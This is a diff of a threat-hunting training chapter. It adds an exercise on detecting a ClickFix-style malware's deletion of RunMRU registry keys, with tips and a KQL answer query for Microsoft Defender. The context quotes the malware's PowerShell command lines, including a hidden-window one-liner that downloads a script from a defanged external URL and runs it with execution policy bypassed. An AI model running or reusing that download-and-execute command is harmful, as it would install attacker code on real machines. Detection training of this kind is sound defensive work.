@@ -130,7 +130,40 @@ This chapter uses the [triage query](#clickfix-triage) as starting point and unc
 As starting point the [incident](https://security.microsoft.com/incident2/126/) in security.microsoft.com can be used.
 
 
-**Initial infection**
+**Anti Forensics**
+The malware deleted the RunMRU registry keys after the host got infected, with this they want to remove their traces and make it harder to perform an investigation. Try to identify this anti forensic mechanism using KQL.
+
+<details>
+<summary>Tip 1</summary>
+Investigate what actions were executed from the commandline below.
+```PowerShell
+"powershell.exe" -w h -ep Bypass -f C:\Users\level1\AppData\Roaming\djw\6kn9.ps1
+```
+</details>
+
+
+<details>
+<summary>Tip 2</summary>
+The RunMRU registry key has been deleted, you can use the below query as starting point to detect the activity.
+
+```KQL
+DeviceRegistryEvents
+| where ActionType == "RegistryValueDeleted"
+```
+</details>
+
+<details>
+<summary>Answer</summary>
+```KQL
+DeviceRegistryEvents
+| where ActionType == "RegistryValueDeleted"
+| where PreviousRegistryKey has "RunMRU"
+| project-reorder Timestamp, PreviousRegistryKey, PreviousRegistryValueName, PreviousRegistryValueData, InitiatingProcessCommandLine
+```
+</details>
+
+
+
 
 ```PowerShell
 powershell -w h -nop -c "$s=Join-Path $env:APPDATA 'djw\6kn9.ps1';md (Split-Path $s) -ea 0;$l='hxxps://cbtechnic[.]com/0.wav';iwr $l -OutFile $s;& powershell -w h -ep Bypass -f $s"
